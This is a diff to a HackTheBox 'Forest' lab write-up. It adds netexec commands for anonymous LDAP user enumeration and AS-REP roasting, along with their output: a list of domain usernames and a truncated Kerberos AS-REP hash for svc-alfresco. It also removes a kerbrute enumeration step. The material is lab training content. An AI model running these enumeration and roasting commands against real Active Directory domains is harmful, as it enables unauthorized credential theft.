@@ -42,24 +42,32 @@ nmap -sC -sV -T4 10.10.10.161 -oA nmap/forest
 Generated and appended a hosts file to `/etc/hosts` to avoid possible DNS issues later on with Kerberos.
 ```bash
 nxc smb '10.10.10.161' --generate-hosts-file files/hosts && sudo tee -a /etc/hosts < files/hosts
+
+tail -n 1 /etc/hosts
+10.10.10.161     FOREST.htb.local FOREST
 ```
 
 Enumerated the domain users.
 ```bash
-nxc ldap 'FOREST' -u '' -p '' -d htb.local --users-export files/users.txt
+nxc ldap 'FOREST' -u '' -p '' -d 'htb.local' --active-users | awk '{print $5}' | grep -v '^[H,\[,-]' > files/users.txt && cat files/users.txt 
+
+
+Administrator
+sebastien
+lucinda
+svc-alfresco
+andy
+mark
+santi
 ```
 
-Cleaned out the system and service accounts from `users.txt`.
+Performed an asreproast attack on the list of users, to find a service account `svc-alfresco` with Kerberos pre-authentication disabled.
 ```bash
-grep -v -E '^SM_|^HealthMailbox|^svc-|^\$[0-9]+-' files/users.txt > tmp && mv tmp files/users.txt
+nxc ldap 'FOREST' -u files/users.txt  -p '' -d 'htb.local' --asreproast files/roast.txt     
+
+...
+LDAP        10.10.10.161    389    FOREST           $krb5asrep$23$svc-alfresco@HTB.LOCAL:d92213ff872a80624a412d802a52b446$...
 ```
-
-Ran that list against `kerbrute` to validate the accounts.
-```bash
-kerbrute userenum -d htb.local --dc 'FOREST.htb.local' files/users.txt | grep "VALID USERNAME" | awk '{print $7}' | cut -d'@' -f1 > files/valid_users.txt
-```
-
-
 
 
 ## Exploitation
@@ -79,4 +87,4 @@ kerbrute userenum -d htb.local --dc 'FOREST.htb.local' files/users.txt | grep "V
 ## References
 
 ---
-#forest #htb #easy #windows
+#forest #htb #easy #windows #netexec #asreproast
